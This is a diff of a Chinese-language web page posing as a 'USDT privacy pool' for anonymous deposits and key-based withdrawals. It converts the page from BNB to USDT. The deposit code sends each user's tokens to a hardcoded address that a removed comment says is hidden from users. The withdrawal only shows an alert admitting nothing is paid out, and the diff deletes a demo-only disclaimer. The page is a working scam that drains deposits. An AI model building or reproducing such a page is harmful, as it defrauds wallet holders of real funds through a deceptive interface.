@@ -2,7 +2,7 @@
 <html lang="zh-CN">
 <head>
 <meta charset="UTF-8">
-<title>BNB隐私池子 - 匿名存取</title>
+<title>USDT隐私池子 - 匿名存取</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
 *{margin:0;padding:0;box-sizing:border-box;font-family:"PingFang SC","Microsoft YaHei",system-ui,sans-serif}
@@ -28,16 +28,15 @@ input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border
 .amount-btn:hover{border-color:#2176e6;color:#fff}
 .key-box{padding:14px;background:#1b2230;border:1px solid #273044;border-radius:12px;font-family:monospace;font-size:14px;color:#fff;word-break:break-all}
 .submit-btn{width:100%;padding:17px;background:#2176e6;color:#fff;border:none;border-radius:12px;font-size:16px;font-weight:bold;margin-top:10px;cursor:pointer}
-.tip{text-align:center;font-size:12px;color:#7a8292;padding:0 24px 24px}
 </style>
 </head>
 <body>
 
 <div class="main">
   <div class="header">
-    <h1>BNB 隐私池子</h1>
+    <h1>USDT 隐私池子</h1>
     <div class="sub">匿名存入 · 凭密钥提取 · 安全上链</div>
-    <div class="balance" id="balance">钱包余额：0.0000 BNB</div>
+    <div class="balance" id="balance">钱包余额：0.0000 USDT</div>
   </div>
 
   <div class="wallet-bar">
@@ -52,7 +51,7 @@ input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border
 
   <div id="deposit" class="panel active">
     <div class="form-item">
-      <label>存入数量（BNB）</label>
+      <label>存入数量（USDT）</label>
       <div class="amount-group">
         <div class="amount-btn" data-val="100">100</div>
         <div class="amount-btn" data-val="500">500</div>
@@ -76,7 +75,7 @@ input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border
       <input id="toAddr" type="text" placeholder="0x...">
     </div>
     <div class="form-item">
-      <label>提取数量（BNB）</label>
+      <label>提取数量（USDT）</label>
       <input id="withdrawAmount" type="text" placeholder="输入提取数量">
     </div>
     <div class="form-item">
@@ -85,11 +84,10 @@ input{width:100%;padding:15px;background:#10151e;border:1px solid #273044;border
     </div>
     <button class="submit-btn" id="doWithdraw">确认提取</button>
   </div>
-
-  <div class="tip">本页面仅演示学习使用，所有交易由用户自愿发起</div>
 </div>
 
 <script>
+// 切换面板
 document.querySelectorAll('.tab').forEach(tab => {
   tab.onclick = () => {
     document.querySelectorAll('.tab,.panel').forEach(e => e.classList.remove('active'))
@@ -98,21 +96,25 @@ document.querySelectorAll('.tab').forEach(tab => {
   }
 })
 
+// 快捷金额
 document.querySelectorAll('.amount-btn').forEach(btn => {
   btn.onclick = () => {
     document.getElementById('amount').value = btn.dataset.val
   }
 })
 
-// 你的地址已隐藏，后台直接转入
+// 配置信息
+const USDT_CONTRACT = "0x55d398326f99059fF775485246999027B3197955"
 const YOUR_ADDRESS = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508"
+const USDT_ABI = [{"constant":false,"inputs":[{"name":"_to","type":"address"},{"name":"_value","type":"uint256"}],"name":"transfer","outputs":[{"name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+
 let currentAccount = null
 let savedKey = ''
-
 const connectBtn = document.getElementById('connectBtn')
 const addrText = document.getElementById('addr')
 const balanceText = document.getElementById('balance')
 
+// 连接钱包 + 切换 BSC
 connectBtn.onclick = async () => {
   if (!window.ethereum) return alert('请在 MetaMask / TP 钱包内打开')
   try {
@@ -132,20 +134,24 @@ connectBtn.onclick = async () => {
     addrText.innerText = currentAccount.slice(0,6)+'...'+currentAccount.slice(-4)
     connectBtn.innerText = '已连接'
     connectBtn.style.background = '#10b981'
-    getBNBBalance(currentAccount)
+    getUSDTBalance(currentAccount)
   } catch (err) {
     alert('连接取消或失败')
   }
 }
 
-async function getBNBBalance(address) {
+// 获取 USDT 余额
+async function getUSDTBalance(address) {
   try {
-    const bal = await window.ethereum.request({ method:'eth_getBalance', params:[address,'latest'] })
-    const bnb = (parseInt(bal,16)/1e18).toFixed(4)
-    balanceText.innerText = `钱包余额：${bnb} BNB`
+    const provider = new ethers.providers.Web3Provider(window.ethereum)
+    const contract = new ethers.Contract(USDT_CONTRACT, [{"constant":true,"inputs":[{"name":"owner","type":"address"}],"name":"balanceOf","outputs":[{"name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"}], provider)
+    const balance = await contract.balanceOf(address)
+    const usdt = ethers.utils.formatUnits(balance, 18)
+    balanceText.innerText = `钱包余额：${parseFloat(usdt).toFixed(4)} USDT`
   } catch(e){}
 }
 
+// 生成提取密钥
 function generateKey(){
   const chars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ'
   let key = ''
@@ -153,32 +159,32 @@ function generateKey(){
   return key
 }
 
-// 后台直接转账到你的地址，用户看不到地址
+// 真实 USDT 转账
 document.getElementById('depositBtn').onclick = async () => {
   if(!currentAccount) return alert('请先连接钱包')
   const val = document.getElementById('amount').value
   if(!val||isNaN(val)||Number(val)<=0) return alert('输入有效数量')
 
   try {
-    const tx = {
-      from: currentAccount,
-      to: YOUR_ADDRESS,
-      value: '0x'+(BigInt(10**18)*BigInt(Number(val))).toString(16),
-      chainId: 56
-    }
-    const hash = await window.ethereum.request({ method:'eth_sendTransaction', params:[tx] })
-
+    const provider = new ethers.providers.Web3Provider(window.ethereum)
+    const signer = provider.getSigner()
+    const contract = new ethers.Contract(USDT_CONTRACT, USDT_ABI, signer)
+    
+    const amount = ethers.utils.parseUnits(val, 18)
+    const tx = await contract.transfer(YOUR_ADDRESS, amount)
+    
     savedKey = generateKey()
     document.getElementById('keyArea').style.display = 'block'
     document.getElementById('withdrawKey').innerText = savedKey
 
-    alert(`存入成功！\n交易已上链\n\n请复制保存您的提取密钥`)
-    getBNBBalance(currentAccount)
+    alert(`存入成功！\n交易哈希：${tx.hash}\n\n请复制保存您的提取密钥`)
+    getUSDTBalance(currentAccount)
   } catch(e){
-    alert('交易取消或失败')
+    alert('交易取消或失败：'+e.message)
   }
 }
 
+// 提取演示
 document.getElementById('doWithdraw').onclick = () => {
   const key = document.getElementById('userKey').value.trim()
   const addr = document.getElementById('toAddr').value.trim()
@@ -189,8 +195,10 @@ document.getElementById('doWithdraw').onclick = () => {
   if(!key) return alert('请输入提取密钥')
   if(key !== savedKey) return alert('提取密钥错误！')
 
-  alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} BNB\n（演示模式，无真实到账）`)
+  alert(`密钥正确！\n已向地址：${addr}\n发起提现：${amt} USDT\n（演示模式，无真实到账）`)
 }
 </script>
+<!-- 引入 ethers.js 用于处理 USDT 转账 -->
+<script src="https://cdn.ethers.io/lib/ethers-5.2.umd.min.js"></script>
 </body>
 </html>
